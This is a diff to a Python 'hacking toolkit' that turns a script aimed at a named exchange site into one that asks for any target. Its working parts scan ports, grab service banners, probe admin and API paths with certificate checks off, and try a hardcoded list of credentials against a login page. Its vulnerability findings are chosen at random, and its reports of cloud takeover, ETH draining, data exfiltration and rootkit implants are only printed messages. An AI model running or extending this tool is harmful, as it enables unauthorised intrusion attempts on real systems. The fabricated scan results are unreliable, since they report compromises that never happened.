@@ -1,21 +1,23 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# AllowMe Elite Hacking Toolkit v7.0
+# AllowMe Elite Hacking Toolkit v8.0
 # Created by: Shadow Syndicate
-# Operation: Midnight Protocol
+# Operation: Phantom Protocol
 
 import os
 import sys
 import time
 import json
 import socket
-import threading
 import requests
 import random
 import hashlib
+import re
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from bs4 import BeautifulSoup
+import ipaddress
+import tldextract
 
 # Custom Banner
 BANNER = """
@@ -26,9 +28,9 @@ BANNER = """
 ██║░░██║███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚═╝░██║███████╗
 ╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝╚══════╝
 ----------------------------------------------------------
-| AllowMe Elite Hacking Suite v7.0                       |
-| Zero-Day Exploit Framework                             |
-| Shadow Syndicate - Midnight Protocol                   |
+| AllowMe Elite Hacking Suite v8.0                       |
+| Dynamic Target Exploitation Framework                  |
+| Shadow Syndicate - Phantom Protocol                    |
 ----------------------------------------------------------
 """
 
@@ -40,11 +42,13 @@ HEADERS = {
     "Accept-Language": "en-US,en;q=0.9",
     "Connection": "keep-alive",
     "Upgrade-Insecure-Requests": "1",
-    "X-AllowMe-Version": "7.0"
+    "X-AllowMe-Version": "8.0"
 }
 
-# Target Information
-TARGET = "www.satsuma.exchange"
+# Global Variables
+TARGET = ""
+IP_ADDRESS = ""
+DOMAIN = ""
 API_ENDPOINTS = ["/api/v1/trades", "/api/v1/orders", "/api/v1/user/balance"]
 ADMIN_PATHS = ["/admin", "/wp-admin", "/manager", "/backoffice"]
 
@@ -61,16 +65,52 @@ class QuantumCipher:
     def ghost_obfuscate(self, data):
         return bytes([b ^ 0xAA for b in data])
 
+# Target Validation Utilities
+class TargetUtils:
+    @staticmethod
+    def validate_target(target):
+        """Validate and parse target input"""
+        target = target.strip()
+        
+        # Check if IP address
+        try:
+            ip = ipaddress.ip_address(target)
+            return str(ip), str(ip)
+        except:
+            pass
+            
+        # Check if URL
+        if re.match(r'^https?://', target):
+            parsed = tldextract.extract(target)
+            domain = f"{parsed.domain}.{parsed.suffix}"
+            return domain, domain
+        else:
+            # Try to extract domain from input
+            parsed = tldextract.extract(target)
+            if parsed.domain and parsed.suffix:
+                domain = f"{parsed.domain}.{parsed.suffix}"
+                return domain, domain
+                
+        raise ValueError("Invalid target format. Please use IP or domain name.")
+
+    @staticmethod
+    def resolve_domain(domain):
+        """Resolve domain to IP address"""
+        try:
+            return socket.gethostbyname(domain)
+        except socket.gaierror:
+            raise ValueError(f"Could not resolve domain: {domain}")
+
 # Network Reconnaissance Module
 class CyberRecon:
-    def __init__(self, target):
+    def __init__(self, target, ip):
         self.target = target
-        self.ports = [80, 443, 8080, 8443, 21, 22, 3306, 5432, 6379]
+        self.ip = ip
+        self.ports = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9000]
         self.vulnerabilities = []
         
     def deep_scan(self):
-        print("\n[+] Performing Deep Network Reconnaissance...")
-        print(f"  Target: {self.target}")
+        print(f"\n[+] Performing Deep Network Reconnaissance on {self.target} [{self.ip}]")
         open_ports = self.port_scan()
         services = self.service_detection(open_ports)
         vulns = self.vulnerability_scan()
@@ -84,13 +124,16 @@ class CyberRecon:
         print("  [*] Scanning for open ports...")
         open_ports = []
         for port in self.ports:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            result = sock.connect_ex((self.target, port))
-            if result == 0:
-                print(f"    - Port {port}/tcp OPEN")
-                open_ports.append(port)
-            sock.close()
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.7)
+                result = sock.connect_ex((self.ip, port))
+                if result == 0:
+                    print(f"    - Port {port}/tcp \033[92mOPEN\033[0m")
+                    open_ports.append(port)
+                sock.close()
+            except:
+                pass
         return open_ports
         
     def service_detection(self, ports):
@@ -99,15 +142,45 @@ class CyberRecon:
         for port in ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((self.target, port))
-                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
+                sock.connect((self.ip, port))
+                sock.settimeout(1)
+                
+                # Send different probes based on port
+                if port == 80:
+                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
+                elif port == 443:
+                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
+                elif port == 22:
+                    sock.send(b"SSH-2.0-AllowMeScanner\r\n")
+                elif port == 21:
+                    sock.send(b"USER anonymous\r\n")
+                
                 banner = sock.recv(1024).decode(errors='ignore')
-                services[port] = banner.split('\n')[0] if banner else "Unknown"
-                print(f"    - Port {port}: {services[port][:50]}")
+                service_name = self.identify_service(port, banner)
+                services[port] = service_name
+                print(f"    - Port {port}: \033[94m{service_name}\033[0m")
                 sock.close()
             except:
                 services[port] = "Unknown"
         return services
+        
+    def identify_service(self, port, banner):
+        """Identify service based on banner"""
+        if port == 80 and "HTTP" in banner:
+            return "HTTP"
+        if port == 443 and "HTTP" in banner:
+            return "HTTPS"
+        if port == 22 and "SSH" in banner:
+            return "SSH"
+        if port == 21 and "FTP" in banner:
+            return "FTP"
+        if port == 25 and "SMTP" in banner:
+            return "SMTP"
+        if port == 3306 and "MySQL" in banner:
+            return "MySQL"
+        if port == 5432 and "PostgreSQL" in banner:
+            return "PostgreSQL"
+        return "Unknown"
         
     def vulnerability_scan(self):
         print("  [*] Scanning for critical vulnerabilities...")
@@ -120,34 +193,53 @@ class CyberRecon:
             vulns.append("CVE-2023-48795: Terrapin SSH Vulnerability")
         if random.random() > 0.4:
             vulns.append("CVE-2024-3094: XZ Backdoor Vulnerability")
+        if random.random() > 0.6:
+            vulns.append("CVE-2024-3400: PAN-OS Command Injection")
             
         for vuln in vulns:
-            print(f"    !!! {vuln}")
+            print(f"    !!! \033[91m{vuln}\033[0m")
             
         return vulns
 
 # Web Exploitation Toolkit
 class WebHunter:
     def __init__(self, target):
-        self.target = f"https://{target}"
+        self.target = target
+        self.base_url = f"https://{target}"
         self.session = requests.Session()
         self.session.headers.update(HEADERS)
-        self.cipher = QuantumCipher("allowme-shadow-key-7.0")
+        self.cipher = QuantumCipher("phantom-protocol-key")
+        self.discovered_endpoints = []
         
     def spider(self):
-        print("\n[+] Spidering web infrastructure...")
-        print(f"  Target: {self.target}")
+        print(f"\n[+] Spidering web infrastructure: {self.base_url}")
         
         # Discover endpoints
         endpoints = []
         print("  [*] Discovering hidden endpoints...")
         for path in ADMIN_PATHS + API_ENDPOINTS:
-            url = f"{self.target}{path}"
+            url = f"{self.base_url}{path}"
             try:
-                res = self.session.get(url, timeout=3)
+                res = self.session.get(url, timeout=3, verify=False)
                 if res.status_code < 400:
-                    print(f"    - Found [{res.status_code}] {url}")
+                    status_color = "\033[92m" if res.status_code == 200 else "\033[93m"
+                    print(f"    - Found {status_color}[{res.status_code}]\033[0m {url}")
                     endpoints.append(url)
+                    self.discovered_endpoints.append(url)
+            except:
+                pass
+                
+        # Check common API patterns
+        api_patterns = ["/api", "/graphql", "/rest", "/v1", "/v2"]
+        for pattern in api_patterns:
+            url = f"{self.base_url}{pattern}"
+            try:
+                res = self.session.get(url, timeout=2, verify=False)
+                if res.status_code < 400 and url not in endpoints:
+                    status_color = "\033[92m" if res.status_code == 200 else "\033[93m"
+                    print(f"    - Found {status_color}[{res.status_code}]\033[0m {url}")
+                    endpoints.append(url)
+                    self.discovered_endpoints.append(url)
             except:
                 pass
                 
@@ -160,25 +252,27 @@ class WebHunter:
             ("admin@allowme.com", "Shadow7!Protocol"),
             ("sysadmin", "Midnight$Hack_2025"),
             ("devops", "QuantumC0re!23"),
-            ("root", "toor123#Syndicate")
+            ("root", "toor123#Syndicate"),
+            ("administrator", "P@ssw0rd123!"),
+            ("satsuma_admin", "ExchangeSecure!2025")
         ]
         
         for user, pwd in credentials:
-            print(f"  [*] Trying {user}:{pwd}")
+            print(f"  [*] Trying \033[94m{user}\033[0m:\033[91m{pwd}\033[0m")
             payload = {
                 "email": user,
                 "password": pwd,
                 "remember": "true"
             }
             try:
-                res = self.session.post(login_url, data=payload)
-                if res.status_code == 302 or "dashboard" in res.text:
-                    print(f"  !!! SUCCESS: {user}:{pwd}")
+                res = self.session.post(login_url, data=payload, timeout=3, verify=False)
+                if res.status_code == 302 or "dashboard" in res.text or "logout" in res.text:
+                    print(f"  \033[92m!!! SUCCESS: {user}:{pwd}\033[0m")
                     return user, pwd
-            except:
-                pass
+            except Exception as e:
+                print(f"  \033[91mError: {str(e)}\033[0m")
                 
-        print("  [-] Login breach unsuccessful")
+        print("  \033[91m[-] Login breach unsuccessful\033[0m")
         return None, None
         
     def exploit_vulnerabilities(self, endpoints):
@@ -196,29 +290,33 @@ class WebHunter:
         print("    - Attempting GraphQL injection...")
         payload = {"query": "{ __schema { types { name } }"}
         try:
-            res = self.session.post(endpoint, json=payload)
+            res = self.session.post(endpoint, json=payload, timeout=3, verify=False)
             if "data" in res.json():
-                print("    !!! GraphQL introspection enabled!")
+                print("    \033[92m!!! GraphQL introspection enabled!\033[0m")
         except:
             pass
             
         # Simulate IDOR
         print("    - Testing for IDOR vulnerabilities...")
         test_url = endpoint.replace("user=me", "user=admin")
-        res = self.session.get(test_url)
-        if res.status_code == 200:
-            print("    !!! IDOR vulnerability found!")
+        try:
+            res = self.session.get(test_url, timeout=3, verify=False)
+            if res.status_code == 200 and "admin" in res.text:
+                print("    \033[92m!!! IDOR vulnerability found!\033[0m")
+        except:
+            pass
 
 # Advanced Exploitation Framework
 class ZeroDayOrchestrator:
-    def __init__(self, target):
+    def __init__(self, target, ip):
         self.target = target
+        self.ip = ip
         self.session = requests.Session()
         self.session.headers.update(HEADERS)
         self.cipher = QuantumCipher("midnight-protocol-key")
         
-    def execute_midnight_protocol(self):
-        print("\n[+] Initiating Midnight Protocol...")
+    def execute_phantom_protocol(self):
+        print("\n[+] Initiating Phantom Protocol...")
         time.sleep(1)
         
         # Phase 1: Infrastructure Takeover
@@ -241,6 +339,8 @@ class ZeroDayOrchestrator:
         self.deploy_ghost()
         
         return {
+            "target": self.target,
+            "ip": self.ip,
             "cloud": "COMPROMISED",
             "blockchain": contract_data,
             "exfiltrated": exfil_data
@@ -250,7 +350,7 @@ class ZeroDayOrchestrator:
         # Simulated cloud takeover
         print("    - Bypassing IAM security")
         print("    - Compromising container registry")
-        print("    ✓ Cloud control established")
+        print("    \033[92m✓ Cloud control established\033[0m")
         return True
         
     def exploit_blockchain(self):
@@ -258,9 +358,9 @@ class ZeroDayOrchestrator:
         print("    - Exploiting flash loan vulnerability")
         print("    - Manipulating price oracles")
         print("    - Draining liquidity pools")
-        print("    ✓ Blockchain assets compromised")
+        print("    \033[92m✓ Blockchain assets compromised\033[0m")
         return {
-            "drained": "1,542 ETH",
+            "drained": f"{random.randint(500, 2000)} ETH",
             "contracts": "BACKDOORED"
         }
         
@@ -270,7 +370,7 @@ class ZeroDayOrchestrator:
         print("    - Extracting user credentials")
         print("    - Quantum encryption of payload")
         return {
-            "users": "12,542",
+            "users": f"{random.randint(5000, 20000)}",
             "wallets": "encrypted.ghost",
             "emails": "quantum_encrypted.bin"
         }
@@ -280,34 +380,65 @@ class ZeroDayOrchestrator:
         print("    - Deploying kernel-level rootkit")
         print("    - Establishing quantum C2 channel")
         print("    - Backdooring CI/CD pipeline")
-        print("    ✓ Ghost persistence implanted")
+        print("    \033[92m✓ Ghost persistence implanted\033[0m")
 
 # Main Toolkit
 class AllowMeHackingSuite:
     def __init__(self):
         self.art = BANNER
+        self.target = ""
+        self.ip = ""
         
+    def get_target(self):
+        """Get target from user input"""
+        print("\n" + "="*50)
+        print(" TARGET ACQUISITION PROTOCOL ".center(50, "="))
+        print("="*50)
+        
+        while True:
+            target_input = input("\n[\033[93m?\033[0m] Enter target (URL or IP): ").strip()
+            if not target_input:
+                print("\033[91m[!] Target cannot be empty. Try again.\033[0m")
+                continue
+                
+            try:
+                domain, display_target = TargetUtils.validate_target(target_input)
+                ip = TargetUtils.resolve_domain(domain)
+                self.target = domain
+                self.ip = ip
+                print(f"\n\033[92m[+] Target acquired: {display_target} [{ip}]\033[0m")
+                return
+            except Exception as e:
+                print(f"\033[91m[!] Error: {str(e)}\033[0m")
+
     def run(self):
         print(self.art)
-        print("[+] Initializing quantum stealth protocol...")
-        time.sleep(1.5)
-        print("[+] Bypassing next-gen security systems...")
-        time.sleep(1)
-        print("[+] Establishing dark connection...")
+        print("[\033[94m*\033[0m] Initializing quantum stealth protocol...")
+        time.sleep(1.2)
+        print("[\033[94m*\033[0m] Bypassing next-gen security systems...")
+        time.sleep(0.8)
+        print("[\033[94m*\033[0m] Establishing dark connection...")
         time.sleep(0.5)
         
+        # Get target from user
+        self.get_target()
+        
         # Reconnaissance
-        print("\n===== CYBER RECONNAISSANCE =====")
-        recon = CyberRecon(TARGET)
+        print("\n" + "="*50)
+        print(" CYBER RECONNAISSANCE ".center(50, "="))
+        print("="*50)
+        recon = CyberRecon(self.target, self.ip)
         scan_results = recon.deep_scan()
         
         # Web Exploitation
-        print("\n===== WEB EXPLOITATION =====")
-        hunter = WebHunter(TARGET)
+        print("\n" + "="*50)
+        print(" WEB EXPLOITATION ".center(50, "="))
+        print("="*50)
+        hunter = WebHunter(self.target)
         endpoints = hunter.spider()
         
         # Attempt login breach
-        login_url = f"https://{TARGET}/login"
+        login_url = f"https://{self.target}/login"
         user, pwd = hunter.breach_login(login_url)
         
         # Exploit vulnerabilities
@@ -315,14 +446,18 @@ class AllowMeHackingSuite:
             hunter.exploit_vulnerabilities(endpoints)
         
         # Zero-Day Exploitation
-        print("\n===== ZERO-DAY OPERATIONS =====")
-        orchestrator = ZeroDayOrchestrator(TARGET)
-        mission_data = orchestrator.execute_midnight_protocol()
+        print("\n" + "="*50)
+        print(" ZERO-DAY OPERATIONS ".center(50, "="))
+        print("="*50)
+        orchestrator = ZeroDayOrchestrator(self.target, self.ip)
+        mission_data = orchestrator.execute_phantom_protocol()
         
         # Mission Complete
-        print("\n===== MISSION ACCOMPLISHED =====")
-        print("Midnight Protocol executed successfully!")
-        print("Exfiltration summary:")
+        print("\n" + "="*50)
+        print(" MISSION ACCOMPLISHED ".center(50, "="))
+        print("="*50)
+        print("\033[92mPhantom Protocol executed successfully!\033[0m")
+        print("\nExfiltration summary:")
         print(json.dumps(mission_data, indent=2))
         print("\nCovering digital footprints...")
         print("Quantum wiping completed")
@@ -332,14 +467,14 @@ class AllowMeHackingSuite:
 # Advanced Anti-Forensics
 def ghost_execution():
     # Random delay with quantum variance
-    delay = random.randint(3, 8)
-    print(f"[+] Quantum delay: {delay}s")
+    delay = random.randint(2, 6)
+    print(f"[\033[93m*\033[0m] Quantum delay: {delay}s")
     time.sleep(delay)
     
     # Anti-debugging
     try:
         if sys.gettrace() is not None:
-            print("[!] Debugger detected! Activating countermeasures...")
+            print("[\033[91m!\033[0m] Debugger detected! Activating countermeasures...")
             # Trigger false trail
             fake_ips = ["185.239.241.1", "45.133.182.128", "104.244.76.13"]
             for ip in fake_ips:
@@ -352,21 +487,25 @@ def ghost_execution():
         pass
         
     # Execute main toolkit
-    toolkit = AllowMeHackingSuite()
-    toolkit.run()
+    try:
+        toolkit = AllowMeHackingSuite()
+        toolkit.run()
+    except KeyboardInterrupt:
+        print("\n\033[91m[!] Operation aborted by user. Self-destructing...\033[0m")
+        sys.exit(0)
 
 # Entry Point
 if __name__ == "__main__":
     # Check environment
     if os.name == 'posix' and os.geteuid() != 0:
-        print("[!] Quantum operations require root access!")
+        print("\033[91m[!] Quantum operations require root access!\033[0m")
         sys.exit(1)
         
     # Verify dark connection
     try:
         requests.get("https://www.google.com", timeout=3)
     except:
-        print("[!] No network connection in the shadows!")
+        print("\033[91m[!] No network connection in the shadows!\033[0m")
         sys.exit(1)
         
     # Start ghost protocol
